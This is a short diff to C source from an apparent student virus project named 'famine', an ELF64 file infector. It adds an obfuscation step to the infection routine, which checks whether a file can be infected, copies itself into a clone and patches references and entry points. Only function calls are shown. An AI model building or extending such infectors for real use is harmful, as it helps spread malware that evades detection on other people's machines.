@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/15 16:18:41 by ichkamo          ###   ########.fr       */
+/*   Updated: 2019/12/07 20:29:59 by nhaquet          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -90,6 +90,7 @@ bool		elf64_packer(const struct famine food, size_t original_file_size)
 	|| !can_infect(&original_entry, food.original_safe)
 	|| !define_shift_amount(&original_entry, &shift_amount)
 	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
+	|| !obfuscate(&clone_entry, &food)
 	|| !adjust_references(food.clone_safe , shift_amount, &original_entry)
 	|| !find_entry(&clone_entry, food.clone_safe)
 	|| !adjust_sizes(shift_amount, &clone_entry)
